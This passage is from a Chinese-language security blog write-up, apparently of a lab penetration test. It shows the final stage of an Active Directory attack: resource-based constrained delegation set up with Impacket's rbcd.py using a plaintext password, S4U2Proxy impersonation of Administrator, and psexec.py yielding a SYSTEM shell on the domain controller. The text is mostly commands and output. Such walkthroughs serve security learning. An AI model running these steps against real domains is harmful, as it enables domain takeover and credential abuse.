+<p>利用 <code class="notranslate">MrRobot</code> 用户的权限，使用 <code class="notranslate">rbcd.py</code> 脚本来修改 <code class="notranslate">DC$</code> 的安全描述符，授予 <code class="notranslate">NEWPC$</code> 对 <code class="notranslate">DC$</code> 的委派权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to <span class="pl-s"><span class="pl-pds">'</span>DC$<span class="pl-pds">'</span></span> -delegate-from <span class="pl-s"><span class="pl-pds">'</span>NEWPC$<span class="pl-pds">'</span></span> -dc-ip 192.168.205.132 <span class="pl-s"><span class="pl-pds">'</span>novice.com/MrRobot:mrroboto12<span class="pl-pds">'</span></span>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[<span class="pl-k">*</span>] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[<span class="pl-k">*</span>] Delegation rights modified successfully<span class="pl-k">!</span>
+[<span class="pl-k">*</span>] NEWPC$ can now impersonate users on DC$ via S4U2Proxy
+[<span class="pl-k">*</span>] Accounts allowed to act on behalf of other identity:
+[<span class="pl-k">*</span>]     NEWPC$       (S-1-5-21-3649830887-1815587496-1699028491-2601)</pre></div>
+<p>输出确认委派权限已成功修改，<code class="notranslate">NEWPC$</code> 现在可以模拟用户在 <code class="notranslate">DC$</code> 上进行操作了。</p>
+<h2><strong>3.4 Kerberos委派攻击 (S4U2proxy)</strong></h2>
+<p>现在，攻击流程进入最后阶段。</p>
+<ol>
+<li>
+<p><strong>获取 <code class="notranslate">NEWPC$</code> 的 TGT</strong><br>
+首先，使用 <code class="notranslate">getTGT.py</code> 和我们为 <code class="notranslate">NEWPC$</code> 设置的密码，获取其Kerberos TGT（票据授予票据）。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 192.168.205.132 novice.com/NEWPC$:Password123<span class="pl-k">!</span>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[<span class="pl-k">*</span>] Saving ticket <span class="pl-k">in</span> NEWPC$.ccache</pre></div>
+</li>
+<li>
+<p><strong>请求模拟管理员的服务票据</strong><br>
+接下来，利用上一步获取的 TGT，通过 Kerberos S4U2proxy 扩展协议，请求一张可以<strong>模拟 <code class="notranslate">Administrator</code> 用户</strong>身份、并用于访问域控 <code class="notranslate">cifs</code>（文件共享）服务的服务票据 (ST)。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">export</span> KRB5CCNAME=NEWPC$.ccache
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -k -no-pass -spn cifs/dc.novice.com -impersonate Administrator -dc-ip 192.168.205.132 novice.com/NEWPC$       
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[<span class="pl-k">*</span>] Impersonating Administrator
+[<span class="pl-k">*</span>] Requesting S4U2self
+[<span class="pl-k">*</span>] Requesting S4U2Proxy
+[<span class="pl-k">*</span>] Saving ticket <span class="pl-k">in</span> Administrator@cifs_dc.novice.com@NOVICE.COM.ccache</pre></div>
+<p>攻击成功，我们获取了包含管理员权限的服务票据，并保存在一个新的 <code class="notranslate">.ccache</code> 凭证缓存文件中。</p>
+</li>
+</ol>
+<hr>
+<h1><strong>四、夺取域控与总结</strong></h1>
+<h2><strong>4.1 解决名称解析问题</strong></h2>
+<p>在直接使用最终票据进行攻击时，我们的攻击机可能因为无法将域名 <code class="notranslate">dc.novice.com</code> 和 <code class="notranslate">novice.com</code> 解析到正确的IP地址而导致连接失败。为了避免这个问题，需要将域名和IP的对应关系手动写入本地的 <code class="notranslate">/etc/hosts</code> 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo nano /etc/hosts
+[sudo] kali 的密码：
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts                                  
+192.168.205.132 novice.com dc.novice.com DC</pre></div>
+<p>添加此条目后，所有相关的域名都将正确指向目标IP。</p>
+<h2><strong>4.2 最终攻击</strong></h2>
+<ol>
+<li>
+<p><strong>加载最终票据</strong><br>
+首先，更新 <code class="notranslate">KRB5CCNAME</code> 环境变量，使其指向刚刚获取的、包含管理员权限的新票据文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">export</span> KRB5CCNAME=Administrator@cifs_dc.novice.com@NOVICE.COM.ccache</pre></div>
+</li>
+<li>
+<p><strong>执行 <code class="notranslate">psexec.py</code> 获取SYSTEM权限</strong><br>
+最后，使用 <code class="notranslate">psexec.py</code> 和已加载的管理员票据，在域控制器上执行命令。该工具将利用票据进行认证，并在目标上创建一个服务来反弹一个交互式Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.novice.com
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[<span class="pl-k">*</span>] Requesting shares on dc.novice.com.....
+[<span class="pl-k">*</span>] Found writable share ADMIN$
+[<span class="pl-k">*</span>] Uploading file ACAXTjTE.exe
+[<span class="pl-k">*</span>] Opening SVCManager on dc.novice.com.....
+[<span class="pl-k">*</span>] Creating service ELXu on dc.novice.com.....
+[<span class="pl-k">*</span>] Starting service ELXu.....
+[<span class="pl-k">!</span>] Press <span class="pl-c1">help</span> <span class="pl-k">for</span> extra shell commands
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and <span class="pl-k">then</span> execute smbexec.py again with -codec and the corresponding codec
+Microsoft Windows [�汾 10.0.20348.169]
+
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and <span class="pl-k">then</span> execute smbexec.py again with -codec and the corresponding codec
+(c) Microsoft Corporation����������Ȩ����
+
+C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span> whoami
+nt authority<span class="pl-cce">\s</span>ystem</pre></div>
+</li>
+</ol>
+<p><code class="notranslate">whoami</code> 命令的返回结果确认为 <code class="notranslate">nt authority\system</code>，这表明我们已成功获得域控制器的最高系统权限。至此，本次渗透测试圆满完成。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
